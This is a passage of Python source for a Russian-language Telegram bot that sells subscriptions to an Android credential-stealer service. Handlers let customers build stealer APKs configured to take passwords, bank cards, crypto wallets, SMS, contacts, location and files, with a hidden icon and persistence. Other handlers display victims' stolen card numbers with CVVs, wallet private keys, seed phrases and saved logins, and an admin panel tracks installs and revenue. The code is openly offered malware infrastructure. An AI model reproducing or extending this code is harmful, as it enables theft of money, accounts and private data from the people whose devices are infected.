        types.InlineKeyboardButton('✅ ВСЕ ФУНКЦИИ', callback_data='config_all'),
        types.InlineKeyboardButton('⚙️ ВЫБРАТЬ', callback_data='config_select')
    )
    
    bot.send_message(user_id,
        "⚙️ <b>ШАГ 3: НАСТРОЙКА ФУНКЦИЙ</b>\n\n"
        "Выберите набор функций для стиллера:",
        parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'config_all')
def config_all_callback(call):
    user_id = call.from_user.id
    session = db.get_session(user_id)
    
    if session:
        session_data = session['data']
        
        # конфиг со всеми функциями
        config = {
            "name": session_data['name'],
            "collect_passwords": True,
            "collect_banks": True,
            "collect_crypto": True,
            "collect_sms": True,
            "collect_contacts": True,
            "collect_location": True,
            "collect_files": True,
            "collect_apps": True,
            "collect_history": True,
            "auto_start": True,
            "hide_icon": True,
            "persistence": True,
            "encryption": True
        }
        
        # создаем стиллер
        stealer_id = db.create_stealer(user_id, session_data['name'], '', config)
        full_config = db.get_stealer_config(stealer_id, user_id)
        
        # ответ
        response = f"""
        ✅ <b>СТИЛЛЕР СОЗДАН УСПЕШНО!</b>
        
        📝 <b>Название:</b> {session_data['name']}
        🔑 <b>ID:</b> <code>{stealer_id}</code>
        ⚙️ <b>Функции:</b> Все включены
        📱 <b>Установки:</b> 0
        ⏰ <b>Создан:</b> {datetime.now().strftime('%H:%M:%S')}
        
        <b>Webhook URL:</b>
        <code>{full_config['webhook_url']}</code>
        
        <b>API Key:</b>
        <code>{full_config['api_key']}</code>
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton('📱 СКАЧАТЬ APK', callback_data=f'download_{stealer_id}'),
            types.InlineKeyboardButton('📋 КОНФИГ', callback_data=f'config_{stealer_id}'),
            types.InlineKeyboardButton('🔗 WEBHOOK', callback_data=f'webhook_{stealer_id}'),
            types.InlineKeyboardButton('📊 УПРАВЛЕНИЕ', callback_data=f'manage_{stealer_id}')
        )
        
        bot.edit_message_text(response, user_id, call.message.message_id, 
                            parse_mode='HTML', reply_markup=markup)
        
        db.clear_session(user_id)

@bot.message_handler(func=lambda message: message.text == '📊 МОИ СТИЛЛЕРЫ')
def my_stealers(message):
    user_id = message.from_user.id
    stealers = db.get_user_stealers(user_id)
    
    if not stealers:
        bot.send_message(user_id, "📭 У вас пока нет стиллеров.")
        return
    
    response = "📋 <b>ВАШИ СТИЛЛЕРЫ:</b>\n\n"
    
    for i, (stealer_id, name, created, status, installs) in enumerate(stealers, 1):
        response += f"{i}. <b>{name}</b>\n"
        response += f"   🔑 ID: <code>{stealer_id}</code>\n"
        response += f"   📅 Создан: {created[:10]}\n"
        response += f"   📱 Установок: {installs}\n"
        response += f"   🟢 Статус: {status}\n\n"
    
    # кнопки для управления
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = []
    for stealer_id, name, _, _, _ in stealers[:6]:
        buttons.append(types.InlineKeyboardButton(f"📱 {name[:10]}", callback_data=f'view_{stealer_id}'))
    
    # добавляем кнопки по 2 в ряд
    for i in range(0, len(buttons), 2):
        if i+1 < len(buttons):
            markup.add(buttons[i], buttons[i+1])
        else:
            markup.add(buttons[i])
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '💳 БАНКОВСКИЕ ДАННЫЕ')
def show_banks(message):
    user_id = message.from_user.id
    
    if not db.check_subscription(user_id) and not db.get_user(user_id)['is_admin']:
        bot.send_message(user_id, "⛔ Требуется активная подписка!")
        return
    
    banks = db.get_user_banks(user_id, 10)
    
    if not banks:
        bot.send_message(user_id, "📭 Банковские данные не найдены.")
        return
    
    response = "💳 <b>БАНКОВСКИЕ КАРТЫ:</b>\n\n"
    
    for i, (bank, card, expiry, cvv, owner, balance, country, time) in enumerate(banks[:10], 1):
        response += f"{i}. <b>{bank}</b>\n"
        response += f"   💳 Карта: <code>{card}</code>\n"
        response += f"   📅 Срок: {expiry}\n"
        response += f"   🔒 CVV: {cvv}\n"
        response += f"   👤 Владелец: {owner}\n"
        if balance:
            response += f"   💰 Баланс: {balance}\n"
        response += f"   📍 Страна: {country}\n"
        response += f"   ⏰ Время: {time[:16]}\n\n"
    
    bot.send_message(user_id, response, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '₿ КРИПТО')
def show_crypto(message):
    user_id = message.from_user.id
    
    if not db.check_subscription(user_id) and not db.get_user(user_id)['is_admin']:
        bot.send_message(user_id, "⛔ Требуется активная подписка!")
        return
    
    crypto = db.get_user_crypto(user_id, 10)
    
    if not crypto:
        bot.send_message(user_id, "📭 Крипто кошельки не найдены.")
        return
    
    response = "₿ <b>КРИПТО КОШЕЛЬКИ:</b>\n\n"
    
    for i, (wallet_type, address, privkey, seed, balance, time) in enumerate(crypto[:10], 1):
        response += f"{i}. <b>{wallet_type.upper()}</b>\n"
        response += f"   📍 Адрес: <code>{address[:20]}...</code>\n"
        if privkey:
            response += f"   🔑 Приватный ключ: <code>{privkey[:15]}...</code>\n"
        if seed:
            response += f"   🌱 Seed фраза: <code>{seed[:30]}...</code>\n"
        if balance:
            response += f"   💰 Баланс: {balance}\n"
        response += f"   ⏰ Время: {time[:16]}\n\n"
          
    bot.send_message(user_id, response, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '🔑 ПАРОЛИ')
def show_passwords(message):
    user_id = message.from_user.id
    
    if not db.check_subscription(user_id) and not db.get_user(user_id)['is_admin']:
        bot.send_message(user_id, "⛔ Требуется активная подписка!")
        return
    
    passwords = db.get_user_passwords(user_id, 10)
    
    if not passwords:
        bot.send_message(user_id, "📭 Пароли не найдены.")
        return
    
    response = "🔑 <b>СОХРАНЕННЫЕ ПАРОЛИ:</b>\n\n"
    
    for i, (website, username, password, time) in enumerate(passwords[:10], 1):
        response += f"{i}. <b>{website}</b>\n"
        response += f"   👤 Логин: {username}\n"
        response += f"   🔒 Пароль: <code>{password}</code>\n"
        response += f"   ⏰ Время: {time[:16]}\n\n"
    
    bot.send_message(user_id, response, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '👤 ПРОФИЛЬ')
def profile(message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    stats = db.get_user_stats(user_id)
    has_sub = db.check_subscription(user_id)
    
    if has_sub and user['subscription_end']:
        try:
            end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
        except:
            end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S')
        time_left = end_date - datetime.now()
        days = time_left.days
        hours = time_left.seconds // 3600
        sub_status = f"🟢 {days}д {hours}ч"
    else:
        sub_status = "🔴 НЕТ"
    
    response = f"""
    👤 <b>ПРОФИЛЬ ПОЛЬЗОВАТЕЛЯ</b>
    
    📝 <b>Информация:</b>
    • 👤 Имя: @{user['username']}
    • 🆔 ID: <code>{user_id}</code>
    • 📅 Регистрация: {user['reg_date'][:10]}
    • 💳 Подписка: {sub_status}
    
    📊 <b>Статистика:</b>
    • 🔧 Стиллеров: {stats['stealers']}
    • 📱 Установок: {stats['installs']}
    • 💳 Карт: {stats['banks']}
    • ₿ Кошельков: {stats['crypto']}
    • 🔑 Паролей: {stats['passwords']}
    • 💾 Данных: {stats['total_data']}
    
    🚀 <b>Версия системы:</b> {VERSION}
    """
    
    bot.send_message(user_id, response, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '💳 ПОДПИСКА')
def subscription(message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    has_sub = db.check_subscription(user_id)
    
    if has_sub and user['subscription_end']:
        try:
            end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
        except:
            end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S')
        time_left = end_date - datetime.now()
        days = time_left.days
        hours = time_left.seconds // 3600
        
        sub_status = f"🟢 Активна ({days} дней {hours} часов осталось)"
    else:
        sub_status = "🔴 Не активна"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('1 ДЕНЬ - 100₽', callback_data='buy_1day'),
        types.InlineKeyboardButton('7 ДНЕЙ - 500₽', callback_data='buy_7days'),
        types.InlineKeyboardButton('30 ДНЕЙ - 1500₽', callback_data='buy_30days'),
        types.InlineKeyboardButton('📞 ПОДДЕРЖКА', url=f'tg://user?id={ADMIN_ID}')
    )
    
    response = f"""
    💳 <b>УПРАВЛЕНИЕ ПОДПИСКОЙ</b>
    
    👤 <b>Пользователь:</b> @{user['username']}
    ⏱️ <b>Статус:</b> {sub_status}
    
    <b>Тарифы:</b>
    • 1 день - 5$
    • 7 дней - 70$
    • 30 дней - 190$
    
    <b>Как оплатить:</b>
    1. Выберите тариф
    2. напишите владельцу
    3. киньте ему чек CryptoBot (сумма в зависимости какой тариф вы выбрали)
    4. он выдаст
    5. владелец: @ZonatTag
        """
    
    bot.send_message(user_id, response, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '👑 АДМИН')
def admin_panel(message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    
    if not user or not user['is_admin']:
        bot.send_message(user_id, "⛔ Доступ запрещен!")
        return
    
    stats = db.get_system_stats()
    
    response = f"""
    👑 <b>АДМИН ПАНЕЛЬ</b>
    
    📈 <b>Статистика системы:</b>
    • 👥 Пользователей: {stats['total_users']}
    • 🔧 Стиллеров: {stats['total_stealers']}
    • 📱 Установок: {stats['total_installs']}
    • 💳 Карт: {stats['total_banks']}
    • ₿ Кошельков: {stats['total_crypto']}
    • 🔑 Паролей: {stats['total_passwords']}
    • 💾 Данных: {stats['total_data']}
    • 💳 Выручка: {stats['total_revenue']}₽
    
    <b>Быстрые команды:</b>
    /admin_users - Список пользователей
    /admin_stats - Детальная статистика
    /admin_logs - Логи системы
    /admin_backup - Создать бэкап
    """
    
    bot.send_message(user_id, response, parse_mode='HTML')

# ===== запуск =====
def run_bot():
    """запуск телеграм бота"""
    logger.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

def run_server():
    """запуск веб сервера"""
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == '__main__':
    # запускаем в отдельных потоках
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    server_thread = threading.Thread(target=run_server, daemon=True)
    
    bot_thread.start()
    server_thread.start()
    
    # держим основной поток активным
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
